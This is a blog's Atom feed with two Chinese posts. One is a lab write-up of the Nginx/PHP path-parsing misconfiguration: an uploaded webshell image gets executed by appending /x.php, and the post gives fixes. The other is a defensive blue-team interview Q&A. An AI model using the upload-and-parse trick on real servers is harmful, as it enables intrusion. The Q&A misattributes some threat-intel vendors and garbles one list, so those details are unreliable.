<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2023-04-12T04:57:24.774Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Nginx解析漏洞</title>
    <link href="http://example.com/2023/04/12/Nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2023/04/12/Nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/</id>
    <published>2023-04-12T02:04:06.000Z</published>
    <updated>2023-04-12T04:57:24.774Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h2><p>Nginx (engine x) 是一个高性能的HTTP和反向代理web服务器（web容器也叫中间件），同时也提供了IMAP&#x2F;POP3&#x2F;SMTP服务。</p><p>HTTP方向代理，也就是客户端传来的数据先到达Nginx，经Nginx解析后再到达服务端</p><p><img src="/images/Nginx/0.png" alt="反向代理" title="反向代理"></p><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>该漏洞与Nginx,php的版本都无关<br>是由于 Nginx配置不当导致的问题</p><h3 id="php-ini"><a href="#php-ini" class="headerlink" title="php.ini"></a>php.ini</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">php.ini文件中 cgi.fix_pathinfo 的默认值是 1</span><br><span class="line">当php遇到文件路径/test.png/x.php时，若/test.png/x.php不存在，</span><br><span class="line">则会去掉最后的/x.php，然后判断/test.png是否存在，</span><br><span class="line">若存在，则把/test.png当做文件/test.png/x.php解析，</span><br><span class="line">如若test.png还不存在如果在其前面还有后缀，继续前面的步骤，以此类推。</span><br><span class="line">若是关闭该选项，访问/test.jpg/x.php 只会返回找不到文件。</span><br></pre></td></tr></table></figure><h3 id="php-fpm-conf-www-conf"><a href="#php-fpm-conf-www-conf" class="headerlink" title="php-fpm.conf || www.conf"></a>php-fpm.conf || <a href="http://www.conf/">www.conf</a></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php-fpm.conf中的 security.limit_extensions 默认是被注释掉的</span><br><span class="line">也就是只解析.php的文件</span><br><span class="line">如果在其后面加上.php .png .gif 等等</span><br><span class="line">则.png .gif也会当作php文件来解析</span><br></pre></td></tr></table></figure><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>以Vulhub为例</p><p><img src="/images/Nginx/1.png" alt="初始页面" title="初始页面"></p><ul><li><p><strong>上传木马图片</strong></p><p><img src="/images/Nginx/2.png" alt="图片上传" title="图片上传"></p></li><li><p><strong>上传成功</strong></p><p><img src="/images/Nginx/3.png" alt="上传成功" title="上传成功"></p></li><li><p><strong>在文件目录后加上不存在的php文件 x.php</strong></p><p><img src="/images/Nginx/4.png" alt="成功解析" title="成功解析"></p></li></ul><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><ul><li><p>1、 将php.ini文件中的cgi.fix_pathinfo的值设置为0,这样php再解析1.php&#x2F;1.jpg这样的目录时,只要1.jpg不存在就会<br>显示404页面</p></li><li><p>2、 php-fpm.conf中的security.limit_extensions后面的值设置为.php</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Nginx&quot;&gt;&lt;a href=&quot;#Nginx&quot; class=&quot;headerlink&quot; title=&quot;Nginx&quot;&gt;&lt;/a&gt;Nginx&lt;/h2&gt;&lt;p&gt;Nginx (engine x) 是一个高性能的HTTP和反向代理web服务器（web容器也叫中间件），同时也提供了</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>蓝初百题斩</title>
    <link href="http://example.com/2023/04/11/%E8%93%9D%E5%88%9D%E7%99%BE%E9%A2%98%E6%96%A9/"/>
    <id>http://example.com/2023/04/11/%E8%93%9D%E5%88%9D%E7%99%BE%E9%A2%98%E6%96%A9/</id>
    <published>2023-04-11T07:52:37.000Z</published>
    <updated>2023-04-11T08:04:18.881Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Windows-入侵排查思路？"><a href="#Windows-入侵排查思路？" class="headerlink" title="Windows 入侵排查思路？"></a>Windows 入侵排查思路？</h2><ol><li><p>收集信息：收集与系统安全相关的信息，包括日志文件、进程列表、网络连接、系统配置等。</p></li><li><p>分析信息：对收集到的信息进行分析，确定异常行为和潜在威胁。</p></li><li><p>确认威胁：确认系统存在威胁，并确定其类型和程度。</p></li><li><p>阻止攻击：采取相应的措施，尽快阻止攻击并减少损失。</p></li><li><p>恢复系统：对受到攻击的系统进行恢复，确保其正常运行。</p></li></ol><p>具体来说，可以采取以下几种方法进行入侵排查：</p><ol><li><p>使用防病毒软件：定期使用防病毒软件扫描系统，及时发现并清除潜在的威胁。</p></li><li><p>定期更新系统：定期更新系统和安全补丁，以确保系统的安全性。</p></li><li><p>监控网络连接：监控网络连接情况，及时发现异常连接和流量，以及非法访问尝试。</p></li><li><p>分析日志文件：分析日志文件，了解系统的使用情况和异常行为，及时发现威胁。</p></li><li><p>使用安全工具：使用安全工具，如入侵检测系统、网络监控系统等，帮助发现和阻止威胁。</p></li><li><p>加强用户教育：加强用户教育，提高用户安全意识，减少人为因素对系统安全的影响。</p></li></ol><p>总之，入侵排查需要综合运用多种工具和方法，不断加强系统的安全性和监控能力，以保障系统的安全运行。</p><hr><h2 id="Linux-入侵排查思路？"><a href="#Linux-入侵排查思路？" class="headerlink" title="Linux 入侵排查思路？"></a>Linux 入侵排查思路？</h2><ol><li><p>收集基础信息：收集系统的版本、配置文件和日志等信息，了解系统的正常运行状态。</p></li><li><p>分析异常行为：通过比较正常状态与异常状态的差异，分析系统上出现的任何异常行为，例如不寻常的进程、网络流量或文件更改。</p></li><li><p>确认入侵点：确定攻击者可能入侵的方式，并检查是否存在未修复的漏洞。</p></li><li><p>隔离受感染的系统：及时隔离受感染的系统，以限制损害并避免进一步传播。</p></li><li><p>恢复系统：清除恶意代码并修复受损部分，通过备份恢复数据和配置文件，确保系统安全。</p></li><li><p>收集证据：收集入侵事件的详细信息，包括攻击的时间、入侵的方式、影响范围、损失情况等，以便后续追踪和定位攻击者。</p></li></ol><p>在实际操作中，需要结合专业的工具和技能进行排查，例如使用抓包工具Wireshark分析网络流量、使用进程监控工具ps、top、htop等查看进程运行情况。同时，还需要不断学习更新各种安全相关的技能和知识，以提高排查入侵事件的能力。</p><hr><h2 id="Linux-如何查看登录日志？有哪些相关消息文件？"><a href="#Linux-如何查看登录日志？有哪些相关消息文件？" class="headerlink" title="Linux 如何查看登录日志？有哪些相关消息文件？"></a>Linux 如何查看登录日志？有哪些相关消息文件？</h2><p>在 Linux 系统中，可以通过以下方式查看登录日志：</p><ol><li><p>&#x2F;var&#x2F;log&#x2F;auth.log文件：该文件记录了所有用户的认证信息，包括 SSH 登录、sudo 访问以及 su 切换等操作。</p></li><li><p>&#x2F;var&#x2F;log&#x2F;secure文件：该文件用于记录系统身份验证和授权消息，通常在 Red Hat 系统上使用。其中包括 SSH 登录、sudo 访问以及 su 切换等操作。</p></li><li><p>&#x2F;var&#x2F;log&#x2F;messages文件：该文件记录了系统的运行消息，包括启动和关闭服务、内核消息以及其他重要事件。</p></li><li><p>w命令：可以查看当前已登录的用户和他们的会话信息。</p></li><li><p>last命令：可以查看最近所有登录和注销会话的用户列表以及日期和时间。</p></li><li><p>lastlog命令：可以查看所有用户最后一次登录的时间和位置。</p></li></ol><p>需要注意的是，在某些系统中这些文件名可能会有所不同，例如 Ubuntu 系统中的 &#x2F;var&#x2F;log&#x2F;auth.log 文件可能是 &#x2F;var&#x2F;log&#x2F;auth.log.1、&#x2F;var&#x2F;log&#x2F;auth.log.2.gz等形式。因此，在查看登录日志时，最好先了解当前系统的具体情况。</p><hr><h2 id="Windows-和-Linux-的日志文件放在哪里？"><a href="#Windows-和-Linux-的日志文件放在哪里？" class="headerlink" title="Windows 和 Linux 的日志文件放在哪里？"></a>Windows 和 Linux 的日志文件放在哪里？</h2><p>Windows:</p><ol><li><p>系统事件记录器：Event Viewer 应用程序中提供了 Windows 系统的事件日志管理工具。这些日志文件通常存储在 C:\Windows\System32\winevt\Logs 目录中。</p></li><li><p>应用程序日志：包括应用程序特定的事件、错误和警告等信息，可以使用 Event Viewer 应用程序进行查看。这些日志文件通常存储在应用程序的安装目录下或者 Windows 系统目录中。</p></li><li><p>安全日志：记录有关系统安全性的重要信息，例如登录、注销、权限更改等。这些日志文件通常存储在 C:\Windows\System32\winevt\Security.evtx 文件中。</p></li></ol><p>Linux:</p><ol><li>系统日志：Linux 系统中的所有日志都存储在 &#x2F;var&#x2F;log 目录下。主要的日志文件包括：</li></ol><ul><li><p>&#x2F;var&#x2F;log&#x2F;messages：记录系统启动期间的消息以及其他系统级别的消息。</p></li><li><p>&#x2F;var&#x2F;log&#x2F;syslog：记录核心系统日志，也包括其他应用程序的日志。</p></li><li><p>&#x2F;var&#x2F;log&#x2F;auth.log：记录用户登录和其他身份验证相关事件的日志文件。</p></li></ul><ol><li>各种服务&#x2F;软件的日志文件：各种服务或软件分别根据自己的命名规范来命名相应的日志文件，其中一些可能位于 &#x2F;var&#x2F;log 目录下，而另一些则可能位于 &#x2F;var&#x2F;log&#x2F;service 目录下。</li></ol><p>需要注意的是，日志文件在系统运行一段时间后可能会变得非常庞大，因此需要定期进行归档和清理，以释放磁盘空间并提高系统性能。</p><hr><h2 id="Linux-常用排查命令有哪些？"><a href="#Linux-常用排查命令有哪些？" class="headerlink" title="Linux 常用排查命令有哪些？"></a>Linux 常用排查命令有哪些？</h2><p>在 Linux 系统中，有许多工具和命令可以用来排查问题。以下是一些常用的排查命令：</p><ol><li><p>top：显示当前系统中最占用 CPU 和内存的进程。</p></li><li><p>ps：显示当前系统所有运行的进程列表。</p></li><li><p>netstat：显示网络连接状态和统计信息，例如打开的端口、TCP&#x2F;UDP 连接和网络接口等。</p></li><li><p>ifconfig&#x2F;iwconfig：显示网络接口的状态和配置信息。</p></li><li><p>ping&#x2F;traceroute：用于测试网络是否连通以及检测网络故障的工具。</p></li><li><p>df&#x2F;du：显示磁盘使用情况，包括已用空间和可用空间等信息。</p></li><li><p>ls&#x2F;lsof：用于查看打开的文件、目录和文件描述符。</p></li><li><p>strace&#x2F;ltrace：跟踪应用程序执行期间的系统调用和库函数调用。</p></li><li><p>tcpdump：捕获网络数据包并将其记录到日志文件中，以便进行后续分析。</p></li><li><p>tail：实时监视日志文件，并显示最新添加的日志信息。</p></li></ol><p>以上这些命令只是其中的一部分，不同的问题可能需要使用不同的命令和工具。在实际操作中，需要根据具体的情况选择合适的命令和工具，并结合自己的经验和知识进行排查。</p><hr><h2 id="Linux-的-Selinux-是什么？如何设置-Selinux？"><a href="#Linux-的-Selinux-是什么？如何设置-Selinux？" class="headerlink" title="Linux 的 Selinux 是什么？如何设置 Selinux？"></a>Linux 的 Selinux 是什么？如何设置 Selinux？</h2><p>SELinux（Security-Enhanced Linux）是一个针对 Linux 内核的安全模块，它可以限制进程和用户的访问权限，并提供更加细粒度的访问控制。SELinux 基于强制访问控制（MAC）模型，将每个进程&#x2F;对象分配到不同的安全上下文中，并通过策略文件来定义这些上下文之间的关系。</p><p>在 Linux 中，SELinux 可以通过以下步骤进行设置：</p><ol><li><p>检查 SELinux 状态：使用命令 getenforce 或者 sestatus 来检查当前 SELinux 的状态，例如 enforcing、permissive 或者 disabled 等。</p></li><li><p>修改 SELinux 配置文件 &#x2F;etc&#x2F;selinux&#x2F;config：可以修改 SELINUX 参数的值为 enforcing（强制模式）、permissive（宽容模式）或者disabled（禁用 SELinux）等。</p></li><li><p>安装和管理 SELinux 策略包：使用 yum 命令安装和管理 SELinux 相关的策略包，例如 policycoreutils 和 selinux-policy 等。</p></li><li><p>设定 SELinux 上下文：使用 chcon、semanage 和 restorecon 等命令来更改文件或目录的安全上下文。</p></li><li><p>确认 SELinux 日志：在排除 SELinux 相关问题时可以使用命令 ausearch、ausearch、auditctl 等来确认 SELinux 日志。</p></li></ol><p>需要注意的是，在对 SELinux 进行设置和管理时，需要有一定的 Linux 系统管理经验和 SELinux 相关知识。因为错误的配置可能会导致系统不稳定或者无法启动，所以在操作前应仔细阅读相关文档并进行备份。</p><hr><h2 id="Linux、Windows-安全加固"><a href="#Linux、Windows-安全加固" class="headerlink" title="Linux、Windows 安全加固"></a>Linux、Windows 安全加固</h2><p>Linux 安全加固：</p><ol><li><p>更新所安装的软件包：定期更新系统中所有软件包以修复已知漏洞。</p></li><li><p>禁用不必要的服务：禁用不必要的网络服务，减少攻击面。</p></li><li><p>配置防火墙：使用防火墙限制入站和出站网络流量，只允许合法的流量通过。</p></li><li><p>加强密码策略：设置强密码策略并启用多因素身份验证。</p></li><li><p>禁用 root 登录：禁止使用 root 用户登录系统，并将 sudo 和 su 访问权限限制到必要的人员或组。</p></li><li><p>使用 SELinux 或 AppArmor：使用 SELinux 或 AppArmor 来实现更细粒度的应用程序和文件访问控制。</p></li><li><p>配置 SSH 访问：使用 SSH 协议连接服务器时配置限制 IP 地址和端口号等安全措施。</p></li><li><p>定期备份数据：定期备份重要数据至外部存储设备，以防止数据丢失和系统损坏。</p></li></ol><p>Windows 安全加固：</p><ol><li><p>更新操作系统和软件：及时安装 Windows 操作系统和软件的安全更新。</p></li><li><p>禁用 SMBv1：由于 SMBv1 协议存在一些严重的漏洞，建议禁用 SMBv1 协议。</p></li><li><p>启用 UAC：启用用户账户控制（UAC），以限制非管理员用户的系统访问权限。</p></li><li><p>配置防火墙：使用 Windows 防火墙过滤不必要的网络流量，并确保只允许合法的流量通过。</p></li><li><p>使用 BitLocker 或类似的加密工具：对重要数据和文件进行加密存储，以避免数据泄漏。</p></li><li><p>配置组策略：使用本地组策略或 Active Directory 组策略来限制用户和计算机的访问权限。</p></li><li><p>检查安全事件日志：定期检查 Windows 安全事件日志，了解系统中发生的任何异常事件。</p></li><li><p>定期备份数据：定期备份重要数据至外部存储设备，以防止数据丢失和系统损坏。</p></li></ol><p>需要注意的是，这些措施只是增强系统安全的一部分，而不能保证系统绝对安全。因此，建议采取多种方法来保护自己的系统和数据。</p><hr><h2 id="windows-日志分析工具"><a href="#windows-日志分析工具" class="headerlink" title="windows 日志分析工具"></a>windows 日志分析工具</h2><ol><li><p>Event Viewer：Windows 自带的日志管理工具，可以查看和分析 Windows 系统中的各种事件日志。</p></li><li><p>Log Parser：一款免费的命令行工具，可以查询和分析日志文件、IIS 日志、Windows 注册表、Active Directory 等数据源。</p></li><li><p>Microsoft Message Analyzer：一款强大的网络协议分析工具，可以捕获和分析 Windows 操作系统上的网络流量和事件日志。</p></li><li><p>Syslog-ng：一个高性能的日志管理工具，可以帮助用户收集和分析来自不同平台的日志信息。</p></li><li><p>Graylog：一款开源的日志管理工具，可以帮助用户收集、存储和分析来自不同来源的日志信息，并提供直观易用的用户界面。</p></li><li><p>Splunk：一款商业化的日志管理工具，可以帮助用户实时监控、搜索、分析和可视化来自不同来源的日志信息。</p></li></ol><p>需要注意的是，在选择日志分析工具时，需要根据自己的需求和实际情况进行选择，并结合相关操作系统和网络知识进行使用。</p><hr><h2 id="Linux-日志分析技巧命令"><a href="#Linux-日志分析技巧命令" class="headerlink" title="Linux 日志分析技巧命令"></a>Linux 日志分析技巧命令</h2><ol><li><p>grep 命令：用于在文本文件中搜索指定的字符串和模式，例如可以使用 grep error &#x2F;var&#x2F;log&#x2F;messages 命令来查找系统日志中的错误信息。</p></li><li><p>tail 命令：实时监视日志文件，并显示最新添加的日志信息，例如可以使用 tail -f &#x2F;var&#x2F;log&#x2F;messages 命令来实时监视系统消息。</p></li><li><p>sed 和 awk 命令：可以用来编辑和处理文本文件，例如可以使用 awk ‘&#x2F;error&#x2F; {print $0}’ &#x2F;var&#x2F;log&#x2F;messages 命令来筛选出包含 error 字符串的日志信息。</p></li><li><p>journalctl 命令：用于查询和查看 systemd 系统日志，例如可以使用 journalctl -u nginx.service 命令来查看 Nginx 服务的日志信息。</p></li><li><p>dmesg 命令：用于打印内核环境变量缓冲区的内容包</p><h2 id="Linux-基线规范"><a href="#Linux-基线规范" class="headerlink" title="Linux 基线规范"></a>Linux 基线规范</h2></li></ol><p>Linux 基线规范是指为了保证 Linux 系统安全性和可靠性，制定的一系列最佳实践和标准化要求。Linux 基线规范通常包括以下几个方面：</p><ol><li><p>安全加固：禁用不必要的服务、配置防火墙、强化密码策略等。</p></li><li><p>用户和权限管理：创建普通用户账号、限制 root 账号访问、使用 sudo 进行授权等。</p></li><li><p>日志管理：启用系统日志、日志文件备份和归档、监控日志信息等。</p></li><li><p>文件系统和目录结构规范：对重要数据进行加密、使用 ext4 文件系统、分区管理等。</p></li><li><p>网络安全：检查网络连接状态、限制入站和出站流量、使用 SELinux 或 AppArmor 等。</p></li><li><p>软件更新与安全漏洞修复：定期更新操作系统和软件补丁、及时处理已知漏洞等。</p></li><li><p>数据备份与恢复：定期备份和恢复系统数据和设置等。</p></li></ol><p>需要注意的是，不同的公司或组织可能会有不同的基线规范要求。在实践中，我们可以根据自己的需求和安全风险评估情况，设计并实施相应的基线规范，并定期进行评估和调整。这样可以帮助我们规范化 Linux 系统的管理和维护，并提高系统的可靠性和安全性。</p><hr><h2 id="Windows-安全基线检查"><a href="#Windows-安全基线检查" class="headerlink" title="Windows 安全基线检查"></a>Windows 安全基线检查</h2><p>Windows 安全基线检查是指通过对 Windows 操作系统进行安全配置和最佳实践检查，来评估系统的安全性和完整性。Windows 安全基线包括以下几个方面：</p><ol><li><p>用户和权限管理：创建普通用户账号、限制管理员账号访问、使用 UAC 进行授权等。</p></li><li><p>密码策略：设置强密码策略，并启用多因素身份验证。</p></li><li><p>网络安全：配置防火墙、禁用不必要的服务、加密敏感数据传输等。</p></li><li><p>软件更新与安全漏洞修复：定期更新操作系统和软件补丁、及时处理已知漏洞等。</p></li><li><p>日志管理：启用系统日志、监控日志信息、建立日志归档等。</p></li><li><p>文件和目录权限：配置文件系统和目录结构规范、限制文件和目录访问权限等。</p></li><li><p>数据备份与恢复：定期备份和恢复系统数据和设置等。</p></li></ol><p>为了进行 Windows 安全基线检查，可以使用 Microsoft Security Compliance Toolkit 工具，该工具包含安全基线和最佳实践检查工具，并提供安全配置模板和分析报告。此外，还可以使用第三方商业化工具，例如 SolarWinds、McAfee 等，来帮助进行 Windows 安全基线检查。</p><p>需要注意的是，安全基线检查只是评估系统安全性的一部分。为了保证 Windows 系统的安全性和可靠性，还需要采取其他措施，例如定期更新操作系统和软件补丁、加强密码策略、备份数据等。</p><hr><h2 id="中间件基线规范（APACHE）"><a href="#中间件基线规范（APACHE）" class="headerlink" title="中间件基线规范（APACHE）"></a>中间件基线规范（APACHE）</h2><p>Apache 是一款常用的 Web 服务器软件，为了保障其安全可靠地运行，可以制定中间件基线规范。以下是 Apache 中间件基线规范的一些重要措施：</p><ol><li><p>版本号管理：定期检查并更新 Apache 版本，及时安装最新版本的补丁与安全更新。</p></li><li><p>配置文件规范：对 Apache 的配置文件进行规范化和审计，限制网站访问权限、禁止目录浏览等。</p></li><li><p>日志管理：启用 Apache 访问日志和错误日志，定期清理日志文件并做好备份、归档等工作。</p></li><li><p>安全加固：如禁用不必要的模块、关闭 TRACE 请求响应、限制 HTTP 方法等。</p></li><li><p>SSL&#x2F;TLS 加强：设置 TLS 选项、开启 HSTS、使用证书身份验证等。</p></li><li><p>防火墙和反向代理策略：通过防火墙等技术来过滤恶意流量，使用反向代理策略限制直接连接到 Web 服务器的 IP 地址。</p></li><li><p>应用安全：对 Web 应用程序进行安全审计，确保程序的漏洞被修复、未受到攻击等。</p></li></ol><p>需要注意的是，以上这些措施只是 Apache 中间件基线规范的一部分，实际操作中还需要根据具体情况进行评估和调整。同时，要保障 Apache 服务器的安全性和可靠性，还需要定期备份数据、优化性能等工作。</p><hr><h2 id="中间件常见漏洞"><a href="#中间件常见漏洞" class="headerlink" title="中间件常见漏洞"></a>中间件常见漏洞</h2><p>中间件是指应用程序和操作系统之间的软件组件，常见的中间件漏洞有以下几种：</p><ol><li><p>Web服务器漏洞：针对Web服务器（如Apache、Nginx）的攻击通常包括利用目录遍历、文件包含、SQL注入等技术。</p></li><li><p>数据库漏洞：数据库（如MySQL、Oracle、SQL Server）的漏洞通常涉及未授权的访问、SQL注入等方面。</p></li><li><p>应用服务器漏洞：应用服务器（如Tomcat、JBoss、WebLogic）的漏洞通常会导致远程执行代码、拒绝服务等问题。</p></li><li><p>消息队列漏洞：消息队列（如RabbitMQ、Kafka）的漏洞通常涉及未授权访问、拒绝服务等问题。</p></li><li><p>缓存服务器漏洞：缓存服务器（如Redis、Memcached）的漏洞通常包括未授权访问、命令注入等问题。</p></li><li><p>中间件配置问题：中间件的错误配置也可能导致安全问题，比如弱密码、不安全的协议配置等。</p></li></ol><p>需要注意的是，中间件漏洞是日益增多的，因此建议及时更新和修补中间件的安全漏洞。</p><hr><h2 id="常见中间件的配置文件路径知道哪些？"><a href="#常见中间件的配置文件路径知道哪些？" class="headerlink" title="常见中间件的配置文件路径知道哪些？"></a>常见中间件的配置文件路径知道哪些？</h2><p>不同的中间件软件有不同的配置文件路径。以下是几种常见中间件软件的配置文件路径：</p><ol><li><p>Apache Web 服务器：httpd.conf 文件通常位于 &#x2F;etc&#x2F;httpd&#x2F; 或者 &#x2F;usr&#x2F;local&#x2F;apache2&#x2F;conf&#x2F; 目录下。</p></li><li><p>Nginx Web 服务器：nginx.conf 文件通常位于 &#x2F;etc&#x2F;nginx&#x2F; 或者 &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F; 目录下。</p></li><li><p>MySQL 数据库：my.cnf 文件通常位于 &#x2F;etc&#x2F;mysql&#x2F; 或者 &#x2F;usr&#x2F;local&#x2F;mysql&#x2F;etc&#x2F; 目录下。</p></li><li><p>PostgreSQL 数据库：postgresql.conf 和 pg_hba.conf 文件通常位于 &#x2F;var&#x2F;lib&#x2F;pgsql&#x2F;data&#x2F; 或者 &#x2F;etc&#x2F;postgresql&#x2F;<version>&#x2F;main&#x2F; 目录下。</p></li><li><p>Oracle 数据库：initSID.ora 和 listener.ora 文件通常位于 $ORACLE_HOME&#x2F;dbs&#x2F; 目录下。</p></li><li><p>Tomcat 应用服务器：server.xml、context.xml 和 web.xml 文件通常位于 &#x2F;conf&#x2F; 目录下。</p></li><li><p>JBoss 应用服务器：standalone.xml 和 standalone-full.xml 文件通常位于 &#x2F;standalone&#x2F;configuration&#x2F; 目录下。</p></li></ol><p>需要注意的是，这些路径可能会根据不同的操作系统而有所不同，并且也会随着中间件版本的更新而变化。因此，在进行中间件配置时，建议查询官方文档或参考相关文献以获取最新的配置文件路径信息。</p><hr><h2 id="常用的安全工具以及常见的设备有哪些？"><a href="#常用的安全工具以及常见的设备有哪些？" class="headerlink" title="常用的安全工具以及常见的设备有哪些？"></a>常用的安全工具以及常见的设备有哪些？</h2><p>常用的安全工具和设备有很多，以下是其中一些常见的：</p><ol><li><p>防火墙（Firewall）：防火墙可以过滤网络流量，保护网络不受外部攻击。常见的防火墙包括硬件防火墙和软件防火墙。</p></li><li><p>入侵检测系统（Intrusion Detection System, IDS）：IDS 可以监控网络流量、检测恶意行为和入侵事件，并向管理员发出警报。</p></li><li><p>入侵防御系统（Intrusion Prevention System, IPS）：IPS 可以在 IDS 的基础上主动预防入侵事件，并进行自动化响应。</p></li><li><p>统一威胁管理平台（Unified Threat Management, UTM）：UTM 是一种集成了防火墙、IDS&#x2F;IPS、VPN、反病毒等多种功能的综合性安全解决方案。</p></li><li><p>脆弱性扫描器（Vulnerability Scanner）：脆弱性扫描器可以发现系统中可能存在的漏洞，并提供修补建议。</p></li><li><p>安全信息和事件管理系统（Security Information and Event Management, SIEM）：SIEM 可以对安全事件和日志数据进行收集、分析和报告，帮助管理员更好地了解和响应安全事件。</p></li><li><p>代理服务器（Proxy Server）：代理服务器可以过滤流量、检查内容和访问控制，提供额外的安全保护。</p></li><li><p>负载均衡器（Load Balancer）：负载均衡器可以平衡网络流量，分担服务器负载，提高网络性能和可用性。</p></li><li><p>加密设备：加密设备可以对数据进行加密处理，防止数据被窃取或篡改。</p></li></ol><p>需要注意的是，以上只是其中一些常见的安全工具和设备，实际应用中还有很多其他的安全工具和设备。在选择和使用安全工具和设备时，需要根据具体情况进行评估和选择，并确保其符合实际需求和安全标准。</p><hr><h2 id="你知道的威胁情报库有哪些？"><a href="#你知道的威胁情报库有哪些？" class="headerlink" title="你知道的威胁情报库有哪些？"></a>你知道的威胁情报库有哪些？</h2><ol><li><p>银河麒麟（ThreatBook）：银河麒麟是国内领先的网络安全威胁情报服务提供商，其威胁情报库包括恶意软件、攻击源IP、域名等方面的信息。</p></li><li><p>国家互联网应急中心（CNCERT）：CNCERT 是中国政府统一组织和协调全国互联网安全工作的部门，其威胁情报库包括漏洞、恶意代码、攻击事件等方面的信息。</p></li><li><p>安恒威胁情报中心（ATIS）： ATIS 是安恒信息安全研究院旗下的威胁情报中心，其威胁情报库涵盖了APT攻击、Web攻击、恶意邮件、移动恶意软件等方面的信息。</p></li><li><p>漏洞盒子（KnownSec）：漏洞盒子是一家致力于网络安全防御和攻防技术研究的公司，其威胁情报库包括漏洞、恶意代码等方面的信息。</p></li><li><p>360威胁情报中心（360 TI Center）：360 威胁情报中心聚焦于威胁情报、安全事件响应和恶意代码研究等领域，其威胁情报库包括APT攻击、恶意URL等方面的信息。</p></li></ol><p>需要注意的是，以上威胁情报库只是其中一部分，实际应用中还有很多其他的威胁情报库。在使用威胁情报库时，需要根据具体需求进行评估和选择，并确保数据来源可靠、及时和准确。</p><hr><h2 id="怎么发现有没有被攻击？"><a href="#怎么发现有没有被攻击？" class="headerlink" title="怎么发现有没有被攻击？"></a>怎么发现有没有被攻击？</h2><p>发现自己是否被攻击是网络安全管理中非常重要的一环。以下是几种常见的发现被攻击的方法：</p><ol><li><p>安全日志监控：对系统和应用程序的安全日志进行监控，可以及时发现异常活动和安全事件。例如，登录失败、异常访问、恶意软件入侵等。</p></li><li><p>网络流量分析：通过对网络流量进行监控和分析，可以发现可能存在的攻击行为。例如，大量来自某个 IP 地址或特定端口的流量、恶意脚本和代码注入等。</p></li><li><p>主机基线监测：通过对应用程序、操作系统和数据文件等资源进行基线监测，可以及时发现可能存在的异常变化和不正常的活动。</p></li><li><p>脆弱性扫描：通过使用脆弱性扫描工具，可以发现系统中可能存在的漏洞，并提供修补建议。</p></li><li><p>威胁情报监测：通过使用威胁情报库和服务，可以了解到当前存在的威胁活动，及时采取防御措施。</p></li><li><p>安全演练：通过进行安全演练，可以模拟真实的攻击场景，评估自身的安全状态，及时发现和修复存在的问题。</p></li></ol><p>需要注意的是，以上方法只是其中一部分，实际应用中还有很多其他的发现被攻击的方法。在进行网络安全管理时，需要综合使用多种方法，并不断更新和完善自身的防御措施，以提高安全水平和减少被攻击的风险。</p><hr><h2 id="SQL-注入如何进行检测"><a href="#SQL-注入如何进行检测" class="headerlink" title="SQL 注入如何进行检测"></a>SQL 注入如何进行检测</h2><ol><li><p>数据库异常日志：在数据库服务器上查看异常日志或错误日志，如果发现异常 SQL 语句，或者 SQL 语句中包含可疑代码或关键字，就可能存在 SQL 注入攻击。</p></li><li><p>应用服务器日志：在应用服务器上查看访问日志或错误日志，如果发现访问异常、错误码增多，或者包含可疑的 URL 参数等信息，也可能表明存在 SQL 注入攻击。</p></li><li><p>漏洞扫描工具：使用专业的漏洞扫描工具，可以自动化地检测应用程序中可能存在的 SQL 注入漏洞，并提供修补建议。</p></li><li><p>安全审计：通过记录用户行为和操作日志，可以检测和追踪可能存在的 SQL 注入攻击。</p></li><li><p>手动测试：模拟攻击者的行为，手动输入特定的 SQL 语句或注入代码，来验证是否存在 SQL 注入漏洞。</p></li></ol><p>需要注意的是，以上方法只是其中一部分，实际应用中还有很多其他的 SQL 注入检测方法。在进行 SQL 注入检测时，需要综合使用多种方法，并不断更新和完善自身的防御措施，以提高安全水平和减少被攻击的风险。同时，如果确实发现了 SQL 注入攻击，应及时采取措施来修复漏洞并保护数据库中的数据。</p><hr><h2 id="Sql-注入加固措施？"><a href="#Sql-注入加固措施？" class="headerlink" title="Sql 注入加固措施？"></a>Sql 注入加固措施？</h2><p>为了防止 SQL 注入攻击，可以采取以下一些常见的加固措施：</p><ol><li><p>输入验证：对用户输入数据进行验证和过滤，特别是对单引号、双引号、分号等特殊字符进行处理。可以使用输入过滤函数或正则表达式等方式来实现。</p></li><li><p>参数化查询：使用参数化查询操作数据库，可以将用户输入的数据视为参数而不是 SQL 代码的一部分，从而避免 SQL 注入攻击。</p></li><li><p>最小化权限原则：在应用程序连接数据库时，给予最小必要的权限，并严格控制数据库访问权限，以减少攻击者利用 SQL 注入漏洞获取敏感信息的可能性。</p></li><li><p>安全编码标准：在开发应用程序时，遵循安全编码标准，避免使用拼接 SQL 语句的方式，而是采用参数化查询等安全方式来操作数据库。</p></li><li><p>异常信息处理：在应用程序中添加异常处理机制，可以及时捕获和记录 SQL 注入攻击产生的异常信息，便于管理员及时发现和修复问题。</p></li><li><p>安全审计：通过记录用户行为和操作日志，可以检测和追踪可能存在的 SQL 注入攻击。</p></li></ol><p>需要注意的是，以上只是其中一部分常见的 SQL 